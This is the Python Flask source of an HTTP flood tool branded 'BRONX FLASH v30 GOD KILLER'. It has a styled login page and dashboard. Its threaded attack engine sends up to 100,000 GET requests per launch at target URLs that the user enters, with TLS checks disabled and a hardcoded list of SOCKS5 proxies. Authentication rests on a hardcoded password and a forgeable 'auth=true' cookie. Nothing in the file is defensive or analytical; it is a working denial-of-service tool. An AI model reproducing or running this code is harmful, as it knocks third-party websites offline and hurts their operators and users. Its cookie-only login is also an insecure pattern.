from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import threading
import time
import random
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import urllib3
import json
import os
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
custom_proxies = []
total_lifetime = {"success": 0, "failed": 0, "total": 0}
rate_limit_config = {"enabled": False, "rpm": 15}
multi_session_config = {"enabled": False, "sessions": 5}

CF_IPS = ["104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5","104.16.0.1","104.16.0.2","104.16.0.3","172.67.0.1","172.67.0.2"]
SOCKS5_PROXIES = ["94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080","176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208","162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080","173.212.239.43:1080"]

session_pool = []
def get_session():
    if not session_pool:
        for _ in range(50):
            s = requests.Session()
            s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            session_pool.append(s)
    return random.choice(session_pool)

SPEEDS = {"slow":{"rate":2,"delay":0.2,"workers":2},"fast":{"rate":5,"delay":0.15,"workers":5},"veryfast":{"rate":10,"delay":0.1,"workers":10},"ultra":{"rate":50,"delay":0.05,"workers":25},"lightning":{"rate":100,"delay":0.02,"workers":50},"flash":{"rate":500,"delay":0.001,"workers":100}}

EFFECTS = ["snow","matrix","particles","neon","firefly","glitch","pulse","scanlines","bubbles","stars","rainbow","hacker","cyber","plasma","electric","void","aurora","crystal","inferno","phantom"]
current_effect = "snow"

LOGIN = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v30</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,85,0.05) 1px,transparent 1px);background-size:35px 35px;animation:bgMove 20s linear infinite}
@keyframes bgMove{0%{transform:translate(0)}100%{transform:translate(35px,35px)}}
.box{background:rgba(5,0,10,0.97);padding:50px;border-radius:24px;border:1px solid rgba(255,0,85,0.2);width:420px;text-align:center;z-index:1;box-shadow:0 0 100px rgba(255,0,85,0.15);animation:pulseBox 3s infinite}
@keyframes pulseBox{50%{box-shadow:0 0 150px rgba(255,0,85,0.3)}}
.logo{font-size:4em;animation:glow 2s infinite}@keyframes glow{50%{filter:drop-shadow(0 0 30px rgba(255,0,85,0.8))}}
h1{font-size:2em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.tag{color:#666;font-size:0.7em;letter-spacing:5px;text-transform:uppercase;margin:10px 0}
input{width:100%;padding:16px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:#fff;margin:10px 0;font-size:15px}
input:focus{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.2);outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:12px;font-weight:700;cursor:pointer;font-size:15px;margin-top:15px;letter-spacing:3px;text-transform:uppercase;transition:0.4s;position:relative;overflow:hidden}
.btn:hover{box-shadow:0 0 60px rgba(255,0,85,0.7);transform:translateY(-3px)}.btn:active{transform:scale(0.95)}
.btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.2),transparent);animation:btnShine 2s infinite}
@keyframes btnShine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
</style></head><body>
<div class="box">
<div class="logo">💀</div>
<h1>BRONX FLASH</h1>
<div class="tag">v30 • GOD KILLER</div>
<p style="color:#555;font-size:0.6em;letter-spacing:2px">500 RPS • 20 EFFECTS • MULTI-SESSION</p>
<form method="post">
<input type="text" name="user" placeholder="Username">
<input type="password" name="pass" placeholder="Password">
<button class="btn" type="submit">☠️ ACCESS SYSTEM</button>
</form>
{% if error %}<p style="color:#ff0055;margin-top:10px">{{ error }}</p>{% endif %}
</div></body></html>"""

DASH = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v30</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:20px;line-height:1.5}
.container{max-width:1400px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:20px 30px;border:1px solid rgba(255,255,255,0.06);border-radius:16px;margin-bottom:20px;background:rgba(255,255,255,0.01);flex-wrap:wrap;gap:15px;animation:headerGlow 3s infinite}
@keyframes headerGlow{50%{border-color:rgba(255,0,85,0.3);box-shadow:0 0 30px rgba(255,0,85,0.1)}}
.header h1{font-size:1.8em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:4px}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
.stat{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:18px;text-align:center;transition:0.3s}.stat:hover{border-color:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.2)}
.stat-val{font-size:2.2em;font-weight:800}.s{color:#00ff88}.f{color:#ff0055}.t{color:#ffd700}.r{color:#00c8ff}
.stat-label{font-size:0.55em;text-transform:uppercase;letter-spacing:3px;color:#555;margin-top:3px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(340px,1fr));gap:16px;margin-bottom:20px}
.card{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:24px;transition:0.3s}.card:hover{border-color:rgba(255,0,85,0.2)}
.card h3{font-size:0.7em;font-weight:600;letter-spacing:3px;text-transform:uppercase;margin-bottom:16px;color:#666}
input,select,textarea{width:100%;padding:11px 14px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:#fff;margin:4px 0;font-size:13px;font-family:inherit;resize:vertical;transition:0.2s}
input:focus,select:focus,textarea:focus{border-color:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.15);outline:none}
label{font-size:0.55em;text-transform:uppercase;letter-spacing:2px;color:#555;display:block;margin-top:8px}
.btn{width:100%;padding:12px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:0.7em;letter-spacing:2px;text-transform:uppercase;transition:0.3s;margin:4px 0;position:relative;overflow:hidden}
.btn:hover{box-shadow:0 0 35px rgba(255,0,85,0.5);transform:translateY(-2px)}.btn:active{transform:scale(0.96)}
.btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.2),transparent);animation:shine 2s infinite}
@keyframes shine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
.btn-secondary{background:rgba(255,255,255,0.03);color:#888;border:1px solid rgba(255,255,255,0.1)}.btn-secondary:hover{box-shadow:0 0 20px rgba(255,255,255,0.1);color:#fff}
.btn-danger{background:rgba(255,0,0,0.15);color:#ff4444;border:1px solid rgba(255,0,0,0.2)}.btn-danger:hover{box-shadow:0 0 25px rgba(255,0,0,0.3)}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.logs{background:rgba(0,0,0,0.6);border:1px solid rgba(255,255,255,0.04);border-radius:10px;padding:15px;max-height:220px;overflow:auto;font-size:0.65em;font-family:'SF Mono',monospace;color:#00ff88}
.log-e{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.02);color:#888}
.badge{display:inline-block;padding:5px 14px;border-radius:20px;font-size:0.55em;letter-spacing:2px;text-transform:uppercase}
.badge-active{background:rgba(255,0,85,0.15);color:#ff0055;animation:blink 1s infinite}@keyframes blink{50%{opacity:0.4}}
.toggle-row{display:flex;align-items:center;gap:12px;margin:8px 0}
.toggle{width:44px;height:24px;background:rgba(255,255,255,0.08);border-radius:12px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.4)}.toggle::after{content:'';position:absolute;top:2px;left:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:22px}
.footer{text-align:center;padding:20px;color:rgba(255,255,255,0.15);font-size:0.6em;letter-spacing:3px}
.effect-select{display:flex;flex-wrap:wrap;gap:4px;margin:4px 0}
.effect-opt{padding:5px 10px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:20px;color:#666;font-size:0.55em;cursor:pointer;transition:0.2s;letter-spacing:1px}
.effect-opt:hover,.effect-opt.active{border-color:#ff0055;color:#ff0055;background:rgba(255,0,85,0.1)}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>BRONX FLASH v30</h1><div style="color:#555;font-size:0.55em;letter-spacing:3px">GOD KILLER • 500 RPS • 20 EFFECTS • MULTI-SESSION</div></div>
<div style="display:flex;gap:10px;align-items:center">
<span style="color:#666;font-size:0.55em" id="liveTime"></span>
<a href="/logout" style="color:#ff0055;text-decoration:none;font-size:0.65em;letter-spacing:2px">DISCONNECT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ Success</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ Failed</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 Session</div></div>
<div class="stat"><div class="stat-val r" id="ltTotal">0</div><div class="stat-label">🏆 Lifetime</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 Attack Configuration</h3>
<label>Target URLs (One per line)</label>
<textarea id="urls" rows="3" placeholder="https://target1.com&#10;https://target2.com"></textarea>
<div class="row"><div><label>Requests</label><input type="number" id="count" value="5000"></div><div><label>Speed</label><select id="speed"><option value="slow">🐢 Slow</option><option value="fast">⚡ Fast</option><option value="veryfast">🔥 Very Fast</option><option value="ultra">💀 Ultra</option><option value="lightning">⚡ Lightning</option><option value="flash" selected>💎 FLASH</option></select></div></div>
<button class="btn" onclick="start()">🚀 LAUNCH</button><button class="btn btn-danger" onclick="stop()">⏹️ STOP</button><div id="status" style="margin-top:6px"></div>
</div>

<div class="card">
<h3>🧵 Multi-Session</h3>
<div class="toggle-row"><span style="font-size:0.6em;color:#666">Multi-Session</span><div class="toggle" id="msToggle" onclick="toggleMS()"></div><span id="msLabel" style="font-size:0.6em;color:#666">OFF</span></div>
<label>Sessions</label><input type="number" id="msCount" value="5">
<button class="btn btn-secondary" onclick="saveMS()">💾 Save</button>
</div>

<div class="card">
<h3>⚙️ Rate Limiter</h3>
<div class="toggle-row"><span style="font-size:0.6em;color:#666">Rate Limiter</span><div class="toggle" id="rateToggle" onclick="toggleRate()"></div><span id="rateLabel" style="font-size:0.6em;color:#666">OFF</span></div>
<label>RPM</label><input type="number" id="rpm" value="15">
<button class="btn btn-secondary" onclick="saveRate()">💾 Save</button>
</div>

<div class="card">
<h3>🔧 Proxy</h3>
<div class="toggle-row"><span style="font-size:0.6em;color:#666">Proxy</span><div class="toggle" id="proxyToggle" onclick="toggleProxy()"></div><span id="proxyLabel" style="font-size:0.6em;color:#666">OFF</span></div>
<textarea id="customProxies" rows="2" placeholder="IP:Port"></textarea>
<button class="btn btn-secondary" onclick="saveProxies()">💾 Save</button>
</div>

<div class="card">
<h3>🌐 IP</h3>
<div style="font-size:1.3em;color:#ffd700;text-align:center;padding:8px" id="browserIP">...</div>
<button class="btn btn-secondary" onclick="copyIP()">📋 Copy</button>
</div>

<div class="card">
<h3>🎨 20 Effects</h3>
<div class="effect-select">{% for e in effects %}<span class="effect-opt" onclick="setEffect('{{e}}')">{{e}}</span>{% endfor %}</div>
<button class="btn btn-secondary" onclick="resetStats()">🔄 Reset</button>
</div>
</div>

<div class="card"><h3>📜 Logs</h3><div class="logs" id="logs"><div class="log-e">Ready...</div></div></div>
<div class="footer">💀 BRONX FLASH v30 • GOD KILLER 💀</div>
</div>

<script>
var proxyOn=false,rateOn=false,msOn=false;
function toggleProxy(){proxyOn=!proxyOn;document.getElementById('proxyToggle').classList.toggle('on',proxyOn);document.getElementById('proxyLabel').textContent=proxyOn?'ON':'OFF'}
function toggleRate(){rateOn=!rateOn;document.getElementById('rateToggle').classList.toggle('on',rateOn);document.getElementById('rateLabel').textContent=rateOn?'ON':'OFF'}
function toggleMS(){msOn=!msOn;document.getElementById('msToggle').classList.toggle('on',msOn);document.getElementById('msLabel').textContent=msOn?'ON':'OFF'}
function saveRate(){var rpm=document.getElementById('rpm').value;fetch('/rate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:rateOn,rpm:parseInt(rpm)})})}
function saveMS(){var sc=document.getElementById('msCount').value;fetch('/multisession',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:msOn,sessions:parseInt(sc)})})}
function saveProxies(){var p=document.getElementById('customProxies').value;fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})})}
function setEffect(e){fetch('/effect/'+e).then(function(){document.querySelectorAll('.effect-opt').forEach(function(el){el.classList.remove('active')});event.target.classList.add('active');applyFx(e)})}
function applyFx(e){var b=document.body;document.querySelectorAll('.fx').forEach(function(el){el.remove()});b.style.animation='';b.style.boxShadow='';
if(e==='snow'){for(var i=0;i<25;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;color:#ff0055;font-size:'+(Math.random()*10+8)+'px;left:'+Math.random()*100+'%;animation:fall '+Math.random()*5+3+'s linear infinite;pointer-events:none;z-index:0;opacity:0.5';d.innerHTML='❄️';b.appendChild(d)}}
if(e==='matrix'){for(var i=0;i<35;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;color:#00ff88;font-size:'+(Math.random()*12+6)+'px;left:'+Math.random()*100+'%;animation:fall '+Math.random()*3+2+'s linear infinite;pointer-events:none;z-index:0;opacity:0.6';d.innerHTML=String.fromCharCode(0x30A0+Math.random()*96);b.appendChild(d)}}
if(e==='particles'){for(var i=0;i<20;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;width:'+(Math.random()*3+1)+'px;height:'+(Math.random()*3+1)+'px;background:#ffd700;left:'+Math.random()*100+'%;animation:float '+Math.random()*4+3+'s ease-in-out infinite;border-radius:50%;pointer-events:none;z-index:0';b.appendChild(d)}}
if(e==='stars'){for(var i=0;i<25;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;width:2px;height:2px;background:#fff;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:twinkle '+Math.random()*2+1+'s infinite;pointer-events:none;z-index:0';b.appendChild(d)}}
if(e==='bubbles'){for(var i=0;i<12;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;width:'+(Math.random()*15+8)+'px;height:'+(Math.random()*15+8)+'px;border:1px solid rgba(255,0,85,0.3);left:'+Math.random()*100+'%;border-radius:50%;animation:float '+Math.random()*5+4+'s ease-in-out infinite;pointer-events:none;z-index:0';b.appendChild(d)}}
if(e==='firefly'){for(var i=0;i<12;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;width:3px;height:3px;background:#ffd700;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;border-radius:50%;box-shadow:0 0 8px #ffd700;animation:fly '+Math.random()*3+2+'s ease-in-out infinite;pointer-events:none;z-index:0';b.appendChild(d)}}
if(e==='rainbow'){b.style.animation='rainbowBg 5s infinite'}
if(e==='hacker'){for(var i=0;i<40;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;color:#0f0;font-size:'+(Math.random()*10+6)+'px;left:'+Math.random()*100+'%;animation:fall '+Math.random()*2+1+'s linear infinite;pointer-events:none;z-index:0;opacity:0.7';d.innerHTML=Math.random().toString(36).substring(2,3);b.appendChild(d)}}
if(e==='cyber'){b.style.boxShadow='inset 0 0 200px rgba(0,200,255,0.1)'}
if(e==='plasma'){b.style.animation='plasmaBg 3s infinite'}
if(e==='electric'){for(var i=0;i<15;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;width:2px;height:'+(Math.random()*30+10)+'px;background:#ffd700;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:flash '+Math.random()*0.5+'s infinite;pointer-events:none;z-index:0';b.appendChild(d)}}
if(e==='void'){b.style.background='radial-gradient(circle,rgba(0,0,0,0.8),#000)'}
if(e==='aurora'){b.style.animation='auroraBg 4s infinite'}
if(e==='crystal'){for(var i=0;i<20;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;width:'+(Math.random()*6+2)+'px;height:'+(Math.random()*6+2)+'px;background:rgba(255,255,255,0.1);left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:float '+Math.random()*6+3+'s ease-in-out infinite;pointer-events:none;z-index:0;transform:rotate(45deg)';b.appendChild(d)}}
if(e==='inferno'){b.style.animation='infernoBg 2s infinite'}
if(e==='phantom'){for(var i=0;i<10;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;width:'+(Math.random()*50+20)+'px;height:'+(Math.random()*50+20)+'px;border:1px solid rgba(255,255,255,0.05);left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;border-radius:50%;animation:float '+Math.random()*8+4+'s ease-in-out infinite;pointer-events:none;z-index:0';b.appendChild(d)}}
if(e==='pulse'){b.style.animation='pulseBg 2s infinite'}if(e==='glitch'){b.style.animation='glitchBg 0.3s infinite'}
if(e==='neon'){b.style.boxShadow='inset 0 0 150px rgba(255,0,85,0.1)'}
if(e==='scanlines'){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.06) 0px,rgba(0,0,0,0.06) 2px,transparent 2px,transparent 4px);pointer-events:none;z-index:999';b.appendChild(d)}
}
function resetStats(){fetch('/reset',{method:'POST'}).then(function(){u()})}
function copyIP(){var ip=document.getElementById('browserIP').textContent;navigator.clipboard.writeText(ip)}
function u(){fetch('/stats').then(function(r){return r.json()}).then(function(d){document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;document.getElementById('total').textContent=d.total;document.getElementById('ltTotal').textContent=d.lt_total})}
function l(){fetch('/logs').then(function(r){return r.json()}).then(function(d){document.getElementById('logs').innerHTML=d.logs.map(function(x){return'<div class="log-e">'+x+'</div>'}).join('')})}
function start(){var urls=document.getElementById('urls').value.split('\\n').filter(function(u){return u.trim()});var count=document.getElementById('count').value;var speed=document.getElementById('speed').value;if(urls.length===0)return;fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({urls:urls,count:parseInt(count),speed:speed,proxy:proxyOn})}).then(function(r){return r.json()}).then(function(d){document.getElementById('status').innerHTML='<span class="badge badge-active">ACTIVE</span>';l();u()})}
function stop(){fetch('/stop',{method:'POST'}).then(function(){document.getElementById('status').innerHTML='<span style="color:#666">Terminated</span>';l()})}
fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(d){document.getElementById('browserIP').textContent=d.ip})
applyFx('snow');
setInterval(function(){l();u();document.getElementById('liveTime').textContent=new Date().toLocaleTimeString()},1500)
</script>
<style>
@keyframes fall{to{transform:translateY(110vh) rotate(360deg)}}
@keyframes float{0%,100%{transform:translateY(0)scale(1)}50%{transform:translateY(-30px)scale(1.5)}}
@keyframes twinkle{50%{opacity:0.2}}
@keyframes fly{0%,100%{transform:translate(0,0)}25%{transform:translate(100px,-50px)}50%{transform:translate(-50px,-100px)}75%{transform:translate(-100px,50px)}}
@keyframes flash{0%,100%{opacity:0}50%{opacity:1}}
@keyframes pulseBg{50%{background:rgba(255,0,85,0.02)}}
@keyframes glitchBg{0%,100%{transform:translate(0)}20%{transform:translate(-3px,3px)}40%{transform:translate(3px,-3px)}}
@keyframes rainbowBg{0%{background:#ff0000}20%{background:#ff8800}40%{background:#ffff00}60%{background:#00ff00}80%{background:#0088ff}100%{background:#ff0000}}
@keyframes plasmaBg{0%,100%{background:rgba(255,0,85,0.03)}50%{background:rgba(0,200,255,0.03)}}
@keyframes auroraBg{0%{background:rgba(0,255,136,0.02)}33%{background:rgba(255,0,85,0.02)}66%{background:rgba(0,200,255,0.02)}100%{background:rgba(0,255,136,0.02)}}
@keyframes infernoBg{0%,100%{background:rgba(255,0,0,0.03)}50%{background:rgba(255,136,0,0.05)}}
</style></body></html>"""

# ============================================
# ATTACK ENGINE
# ============================================
def send_direct(url, session):
    try:
        session.get(url, timeout=5, verify=False)
        return True
    except: return False

def attack_worker(attack_id, url, count, delay, mode, use_proxy):
    sessions = []
    if multi_session_config["enabled"]:
        for _ in range(multi_session_config["sessions"]):
            sessions.append(get_session())
    else:
        sessions = [get_session()]
    
    for i in range(count):
        if attack_id not in active_attacks: break
        if rate_limit_config["enabled"]: time.sleep(60 / rate_limit_config["rpm"])
        
        session = random.choice(sessions)
        success = send_direct(url, session)
        
        with threading.Lock():
            if success: attack_stats["success"] += 1; total_lifetime["success"] += 1
            else: attack_stats["failed"] += 1; total_lifetime["failed"] += 1
            attack_stats["total"] += 1; total_lifetime["total"] += 1
        if delay > 0: time.sleep(delay)

def run_attack(attack_id, urls, count, speed, mode, use_proxy):
    config = SPEEDS.get(speed, SPEEDS["flash"])
    workers = min(config["workers"], 100)
    with ThreadPoolExecutor(max_workers=workers) as executor:
        for url in urls:
            for _ in range(max(1, workers // len(urls))):
                executor.submit(attack_worker, attack_id, url, count // workers, config["delay"], mode, use_proxy)
    if attack_id in active_attacks: del active_attacks[attack_id]

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return make_response('<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>')
        return render_template_string(LOGIN, error="Access Denied")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return render_template_string(DASH, effects=EFFECTS, effect=current_effect)

@app.route('/effect/<effect>')
def set_effect(effect):
    global current_effect
    if effect in EFFECTS: current_effect = effect
    return jsonify({"status":"ok"})

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    urls = [u.strip() for u in d.get('urls',[]) if u.strip()]
    count = min(int(d.get('count',1000)),100000)
    speed = d.get('speed','flash')
    mode = d.get('mode','direct')
    use_proxy = d.get('proxy',False)
    if not urls: return jsonify({"error":"URLs required"}),400
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    attack_logs.append(f"🎯 {len(urls)} targets | {count} req | {speed.upper()} | MS:{multi_session_config['enabled']}")
    t = threading.Thread(target=run_attack, args=(aid,urls,count,speed,mode,use_proxy))
    t.daemon=True; t.start()
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/reset', methods=['POST'])
def reset():
    attack_stats["success"] = attack_stats["failed"] = attack_stats["total"] = 0
    return jsonify({"status":"reset"})

@app.route('/rate', methods=['POST'])
def save_rate():
    global rate_limit_config
    d = request.get_json()
    rate_limit_config = {"enabled":d.get('enabled',False),"rpm":d.get('rpm',15)}
    return jsonify({"status":"saved"})

@app.route('/multisession', methods=['POST'])
def save_ms():
    global multi_session_config
    d = request.get_json()
    multi_session_config = {"enabled":d.get('enabled',False),"sessions":d.get('sessions',5)}
    return jsonify({"status":"saved"})

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip() and ':' in p]
    return jsonify({"status":"saved"})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats(): return jsonify({**attack_stats,"lt_total":total_lifetime["total"]})

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    import os as _os
    port = int(_os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
